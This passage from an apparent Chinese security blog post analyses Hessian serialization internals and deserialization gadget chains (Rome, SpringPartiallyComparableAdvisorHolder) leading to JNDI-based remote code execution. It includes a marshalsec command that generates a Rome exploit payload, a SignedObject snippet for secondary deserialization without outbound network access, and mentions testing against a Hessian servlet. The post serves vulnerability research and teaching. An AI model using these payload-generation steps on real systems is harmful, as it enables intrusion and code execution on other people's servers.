class="number">5029</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setDebug(boolean)&quot;</span></span><br><span class="line"><span class="string">&quot;getInitParameterNames__0&quot;</span> -&gt; &#123;Method@<span class="number">5015</span>&#125; <span class="string">&quot;public java.util.Enumeration javax.servlet.GenericServlet.getInitParameterNames()&quot;</span></span><br><span class="line"><span class="string">&quot;getServletConfig__0&quot;</span> -&gt; &#123;Method@<span class="number">4989</span>&#125; <span class="string">&quot;public javax.servlet.ServletConfig javax.servlet.GenericServlet.getServletConfig()&quot;</span></span><br><span class="line"><span class="string">&quot;setSerializerFactory&quot;</span> -&gt; &#123;Method@<span class="number">5027</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.setSerializerFactory(com.caucho.hessian.io.SerializerFactory)&quot;</span></span><br><span class="line"><span class="string">&quot;service&quot;</span> -&gt; &#123;Method@<span class="number">5066</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.service(javax.servlet.ServletRequest,javax.servlet.ServletResponse) throws java.io.IOException,javax.servlet.ServletException&quot;</span></span><br><span class="line"><span class="string">&quot;getSerializerFactory__0&quot;</span> -&gt; &#123;Method@<span class="number">5099</span>&#125; <span class="string">&quot;public com.caucho.hessian.io.SerializerFactory com.caucho.hessian.server.HessianServlet.getSerializerFactory()&quot;</span></span><br><span class="line"><span class="string">&quot;equals&quot;</span> -&gt; &#123;Method@<span class="number">5021</span>&#125; <span class="string">&quot;public boolean java.lang.Object.equals(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;equals__1&quot;</span> -&gt; &#123;Method@<span class="number">5021</span>&#125; <span class="string">&quot;public boolean java.lang.Object.equals(java.lang.Object)&quot;</span></span><br><span class="line"><span class="string">&quot;allow__1&quot;</span> -&gt; &#123;Method@<span class="number">5039</span>&#125; <span class="string">&quot;public void com.caucho.hessian.server.HessianServlet.allow(java.lang.String)&quot;</span></span><br><span class="line"><span class="string">&quot;toString&quot;</span> -&gt; &#123;Method@<span class="number">5074</span>&#125; <span class="string">&quot;public java.lang.String java.lang.Object.toString()&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-2-序列化和反序列化"><a href="#2-2-序列化和反序列化" class="headerlink" title="2.2 序列化和反序列化"></a>2.2 序列化和反序列化</h2><blockquote>
+<p>在上面测试远程调用的过程中，读取和写入数据都用到 <code>readObject</code> 和 <code>writeObject</code>，但是这并不是原生的序列化和反序列化，而是 <code>Hessian</code> 自己按照定义的格式实现的功能，因此这里分析一下<code>Hessian</code> 对于对象的序列化和反序列化</p>
+</blockquote>
+<ul>
+<li>编写测试一下 <code>Hessian2.0</code>协议的序列化和反序列化功能<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serialDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        Person person1=<span class="keyword">new</span> Person();</span><br><span class="line">        person1.setName(<span class="string">&quot;www&quot;</span>);</span><br><span class="line">        person1.setAge(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output hessian2Output = <span class="keyword">new</span> Hessian2Output(os);</span><br><span class="line">        hessian2Output.writeObject(person1);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">        System.out.println(os);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;/tmp/person.bin&quot;</span>);</span><br><span class="line">        fos.write(os.toByteArray());</span><br><span class="line">        fos.flush();</span><br><span class="line">        fos.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ByteArrayInputStream is = <span class="keyword">new</span> ByteArrayInputStream(os.toByteArray());</span><br><span class="line">        Hessian2Input hessian2Input = <span class="keyword">new</span> Hessian2Input(is);</span><br><span class="line">        Person person2 = (Person)hessian2Input.readObject();</span><br><span class="line">        System.out.println(person2.toString());</span><br><span class="line">        System.out.println(person2.getName());</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867118537-1b714f67-163d-491b-b6fb-4f8edd961829.png" alt="image.png"><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709867130040-49c6f238-4a66-4c22-9b59-7191d43dd231.png" alt="image.png"></li>
+</ul>
+<h3 id="2-2-1-序列化"><a href="#2-2-1-序列化" class="headerlink" title="2.2.1 序列化"></a>2.2.1 序列化</h3><ol>
+<li>从 <code>writeObject</code> 调试分析，首先从 SerializerFactory 中根据类获取对应的序列化工具；自定义的类使用的是 <code>UnsafeSerializer</code></li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709868313767-9d3c96a6-576f-4a02-8071-d6d7eade8f0d.png" alt="image.png"></p>
+<ol start="2">
+<li>看一下 <code>getObjectSerializer</code> 方法，步入过程不多说了，图片右边有堆栈信息，过程会判断目标类的类型，默认使用 <code>getDefaultSerializer()</code>获取反序列化工具对象</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709869586881-5e41631e-c8e5-49ac-80f3-acf96be931ee.png" alt="image.png"></p>
+<ol start="3">
+<li>getDefaultSerializer方法会判断类是否实现了 Serializable 接口，如果没有实现会抛出异常，最终返回了默认的序列化工具类<code>com.caucho.hessian.io.UnsafeSerializer</code></li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709869751327-18a1fb1a-8a83-4ca7-8e1f-495f120ee873.png" alt="image.png"></p>
+<ol start="4">
+<li>回到步骤 1 中，继续分析 <code>UnsafeSerializer#writeObject</code></li>
+</ol>
+<p>67 对应 16 进制 0x43，类似于一种<code>tag</code>标识<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870258031-5445511f-ed37-413e-9128-7544e77e54c1.png" alt="image.png"></p>
+<h3 id="2-2-2-反序列化"><a href="#2-2-2-反序列化" class="headerlink" title="2.2.2 反序列化"></a>2.2.2 反序列化</h3><ol>
+<li>首先读取 tag，进入 switch 开始反序列化<ol>
+<li>初始情况下，读取一个字节，并确保是 8 位无符号整数</li>
+</ol>
+</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870382517-514a963d-26cc-4c26-a4ae-e303a0465bc1.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._length &lt;= <span class="keyword">this</span>._offset &amp;&amp; !<span class="keyword">this</span>.readBuffer() ? -<span class="number">1</span> : <span class="keyword">this</span>._buffer[<span class="keyword">this</span>._offset++] &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>然后使用 <code>this.readObjectDefinition((Class)null)</code>读取数据</li>
+</ol>
+<ul>
+<li>反序列化解析 Object 的流程</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709878822225-625ba422-c4e6-4789-a57c-386b52a2b167.png" alt="image.png"></p>
+<ul>
+<li><code>readString()</code>读取数据的方法</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709878454096-afcce0f8-56d0-4753-bb5a-08b0164c2ecd.png" alt="image.png"></p>
+<ul>
+<li>继续调用循环 <code>readObject()</code>方法</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709870449608-8d19d3ff-d108-48f0-b6da-dd808ffc31f0.png" alt="image.png"></p>
+<ol start="3">
+<li>继续读取tag，进入 switch 分支，这里的标识数值是 0x60 也就是 96，这个 tag 对应开始加载 <code>Object</code> 实例 </li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709879475904-cef2dd42-2a9e-4316-8305-ec5500ff9c87.png" alt="image.png"></p>
+<ol start="4">
+<li>看下序列化数据的 16 进制内容，如图；整体上比原生的序列化简化很多很多</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709880542327-f04bd1a6-55ae-4929-9101-7c9cbd9aa4c2.png" alt="iShot_2024-03-08_14.22.40.png"></p>
+<ol start="5">
+<li>上面有个问题，就是”age”字段的值是 10，但是最后一位数据是 0x9a，这个差别很大；</li>
+</ol>
+<p>实际上在第3 步中，读取 <code>String</code> 类型和 <code>Int</code> 的类型字段的”工具类”不同，<code>String</code> 类型会先读取长度，在读取数据，<code>Int</code> 类型的字段值是 10，但是最后一位数据是 0x9a （十进制 154），答案在下图中，Int 类型的 <code>readInt</code> 方法会减去 144<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709880569840-af11bd35-f51f-43f6-953e-a6e92cbd8ffb.png" alt="image.png"></p>
+<h2 id="2-3-漏洞点"><a href="#2-3-漏洞点" class="headerlink" title="2.3 漏洞点"></a>2.3 漏洞点</h2><p>这样的序列化和反序列化就和原生 readObject 那些漏洞不一样了，网上的文章也有很多，漏洞存在于<code>MapDeserializer#readMap</code>针对 <code>Map</code>类型的反序列化过程中</p>
+<h3 id="2-3-1-Map-类型的反序列化"><a href="#2-3-1-Map-类型的反序列化" class="headerlink" title="2.3.1 Map 类型的反序列化"></a>2.3.1 Map 类型的反序列化</h3><ol>
+<li>示例进行序列化和反序列化</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881509467-23d7a0dc-f856-4f61-b269-93016de604d1.png" alt="image.png"><br> 2. 使用 <code>MapDeserializer</code>进行反序列化<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881663047-c2a13fe9-aaea-43ea-a6c4-95ccbfcb750b.png" alt="image.png"></p>
+<ol start="3">
+<li>新建一个 <code>HashMap</code> 对象，通过 <code>readOject</code> 读取序列化数据后，<code>put</code> 到 <code>hashmap</code> 中</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709881832821-e5e87847-97ca-4dd1-b4b9-0da0feebba39.png" alt="image.png"><br>漏洞点也就这里，在原生的反序列化中，和 Map 类型牵扯很多<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709882153911-1b9252cd-d94c-4b1d-bde6-9044c3fc7331.png" alt="image.png"><br><code>HashMap</code> 触发的 <code>key.hashCode()</code><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709882178885-5d33de47-c3f1-47c4-a437-1b7054499d08.png" alt="image.png"><br>[2] <code>TreeMap</code> 中的 <code>compare</code><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709883315921-470ec0b6-1f83-43c2-b12d-37c040f11dd5.png" alt="image.png"><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709883359067-3fe8ecf1-a751-446b-bbc6-2fc8f59265d5.png" alt="image.png"></p>
+<h1 id="3-利用链"><a href="#3-利用链" class="headerlink" title="3. 利用链"></a>3. 利用链</h1><p>利用工具主要是<code>marshalsec</code>，包含的利用链</p>
+<ul>
+<li><code>Rome</code><ul>
+<li>依赖：com.rometools.rome</li>
+</ul>
+</li>
+<li><code>XBean</code><ul>
+<li>依赖：org.apache.xbean.xbean-naming</li>
+</ul>
+</li>
+<li><code>Resin</code><ul>
+<li>依赖：com.caucho.quercus</li>
+</ul>
+</li>
+<li><code>SpringPartiallyComparableAdvisorHolder</code><ul>
+<li>依赖：org.springframewor.spring-aop、org.springframework.spring-context、org.aspectj.aspectjweaver</li>
+</ul>
+</li>
+<li><code>SpringAbstractBeanFactoryPointcutAdvisor</code><ul>
+<li>依赖：org.springframewor.spring-aop、org.springframework.spring-context</li>
+</ul>
+</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709884070523-903801f1-e205-4dfb-a352-33e0e888a011.png" alt="image.png"><br>简单分析两个<code>Rome</code>、<code>SpringPartiallyComparableAdvisorHolder</code></p>
+<h2 id="3-1-Rome利用链"><a href="#3-1-Rome利用链" class="headerlink" title="3.1 Rome利用链"></a>3.1 Rome利用链</h2><h3 id="3-1-1-marshalsec生成-Exp"><a href="#3-1-1-marshalsec生成-Exp" class="headerlink" title="3.1.1 marshalsec生成 Exp"></a>3.1.1 <code>marshalsec</code>生成 Exp</h3><ol>
+<li><p>生成Exp </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.Hessian Rome ldap:<span class="comment">//127.0.0.1:1088 &gt; /tmp/hessian/rome0.bin</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709884824944-64cdd59c-9df1-4e32-ac14-2a48c1f2155e.png" alt="image.png"></p>
+</li>
+<li><p>Exp的层级结构</p>
+</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885063232-1053f1c6-5fdf-47f1-a078-d002be13eee0.png" alt="image.png"></p>
+<ol start="3">
+<li>makeHashCodeTrigger(Object o) 方法<blockquote>
+<p>这里有个问题，v1和 v2 都是一样的，且 Key 和 value 也是一样的，这样会导致exp 会触发四次么？</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885178565-ce53c1f3-879c-44c0-84b5-190245e71098.png" alt="image.png"></p>
+<ul>
+<li>返回 Hessian 序列化数据，这里可以看到，允许设置没有实现 Serializable 的类</li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709885333725-b8022a95-e244-436e-9a20-a77b5548e788.png" alt="image.png"></p>
+<h3 id="3-1-2-利用链分析"><a href="#3-1-2-利用链分析" class="headerlink" title="3.1.2 利用链分析"></a>3.1.2 利用链分析</h3><ol start="4">
+<li>反序列化测试，这里验证了步骤 3 的猜想，触发了 4 次 ldap 请求；这里后面可以改一下<code>marshalsec</code>解决这个问题</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709886180266-e88521ec-4961-48ef-9a7f-3f6e8602d637.png" alt="image.png"></p>
+<ol start="5">
+<li>这里到了 2.3.1 中触发 <code>Hashcode</code> 的地方</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887066255-816a5088-c84d-4a8f-84aa-a6c6a09bc77c.png" alt="image.png"></p>
+<ol start="6">
+<li>进入利用链<code>com.rometools.rome.feed.impl.EqualsBean.class#hashCode</code>，在构造过程中 this.obj 初始化是 <code>ToStringBean</code>类型的对象</li>
+</ol>
+<img src="/img/Hessian反序列化漏洞分析和利用链/1709887180638-000872aa-4e75-4ee8-a6ae-bb0722cc34ea.png" alt="image.png" style="zoom:50%;" />
+
+<ol start="7">
+<li><code>com.rometools.rome.feed.impl.ToStringBean#toString()</code>，在构造过程中，this.obj 中是<code>JdbcRowSetImpl</code>类型</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887475258-4b47564f-4f42-42e3-8e48-c5c8db85aac1.png" alt="image.png"></p>
+<ol start="8">
+<li>进入<code>com.rometools.rome.feed.impl.ToStringBean#toString(String prefix)</code>，如图，获取 this.obj 中所有的无参的 Getter 方法，并且反射调用</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887623206-eb51d396-0e2d-44ca-bc31-8637c7c44158.png" alt="image.png"><br><code>BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);</code><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887739618-82ebedb0-96f7-4ebe-bc4e-3c57664085ce.png" alt="image.png"></p>
+<ol start="9">
+<li>触发 <code>JdbcRowSetImpl#getDataBaseMetaData</code>方法</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887849185-aeab51f3-254f-4722-8acc-7bfce4c8b19f.png" alt="image.png"></p>
+<ol start="10">
+<li><code>JdbcRowSetImpl#connect()</code>方法，进而触发 <code>lookup</code> 导致 <code>JNDI</code> 远程调用，进而 <code>RCE</code></li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709887872183-25594b94-5dde-44d9-9b77-8d2f490dac77.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put</span><br><span class="line">    HashMap.hash</span><br><span class="line">        Object.hashCode</span><br><span class="line">            EqualsBean.hashCode</span><br><span class="line">                EqualsBean.beanHashCode</span><br><span class="line">                    ToStringBean.toString</span><br><span class="line">                        JdbcRowSetImpl.getDataBaseMetaData</span><br><span class="line">                            JdbcRowSetImpl.connect</span><br><span class="line">                              InitialContext.lookup</span><br></pre></td></tr></table></figure>
+<h3 id="3-1-3-二次反序列化不出网利用"><a href="#3-1-3-二次反序列化不出网利用" class="headerlink" title="3.1.3 二次反序列化不出网利用"></a>3.1.3 二次反序列化不出网利用</h3><p>在 3.1.2 分析利用链的第 8 步中，会触发对象的无参<code>Getter</code>方法，如图，<code>java.security.SignedObject#getObject()</code>中触发原生的反序列化RCE，导致二次反序列化<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709889283532-55350583-f829-48f2-8c3e-06f037113987.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator kpg = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject = <span class="keyword">new</span> SignedObject(EvilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>使用 <code>Rome + Commonsbeanutils</code><br>组合二次反序列化，不出网触发 RCE<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709899745035-bad899ed-8e5b-4906-88c8-349f2cc52f38.png" alt="image.png"><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709899688662-1f376d4b-f472-49d3-b5be-cc6e9ea1a8eb.png" alt="image.png"></p>
+<ul>
+<li>测试 打一下 Web 项目中<code>Hessian</code> 的 <code>Sevlet</code></li>
+</ul>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709900082703-00647a06-583a-4c0c-babd-f197097d3bd8.png" alt="image.png"></p>
+<h2 id="3-2-SpringPartiallyComparableAdvisorHolder利用链"><a href="#3-2-SpringPartiallyComparableAdvisorHolder利用链" class="headerlink" title="3.2 SpringPartiallyComparableAdvisorHolder利用链"></a>3.2 SpringPartiallyComparableAdvisorHolder利用链</h2><h3 id="3-2-1-生成"><a href="#3-2-1-生成" class="headerlink" title="3.2.1 生成"></a>3.2.1 生成</h3><p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709947243547-b32bbcb2-c400-4c67-a49e-79fc185eaca6.png" alt="image.png"></p>
+<h3 id="3-2-2-利用链分析"><a href="#3-2-2-利用链分析" class="headerlink" title="3.2.2 利用链分析"></a>3.2.2 利用链分析</h3><ol>
+<li><p><code>HashMap.put</code>调用<code>key.equals(Object o)</code>方法<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948169333-6594f314-e622-4bd3-9df3-c27d2c0bf024.png" alt="image.png"></p>
+</li>
+<li><p>这里通过 marshalsec 生成的 Exp，第二层是 <code>HotSwappable</code> 类，他的 <code>equals(Object x)</code>会调用参数的 <code>equals</code> 方法， 实际上利用链还是从 <code>XString#equals</code>开始，如下图</p>
+</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948246576-6380b61f-0c71-4fcb-854c-ed31fca5ed58.png" alt="image.png"></p>
+<ol start="3">
+<li>进入AspectJAwareAdvisorAutoProxyCreator#toString方法</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948394657-b6b1d64a-e38d-48d2-bace-f6d5d3a65d44.png" alt="image.png"></p>
+<ol start="4">
+<li>进入<code>BeanFactoryAspectInstanceFactory#getOrder()</code>方法</li>
+</ol>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948506479-6a36f4ee-62f9-4cb6-809f-926e8ad54c83.png" alt="image.png"></p>
+<ol start="5">
+<li>如图堆栈所示，最终触发 JNDI远程调用</li>
+</ol>
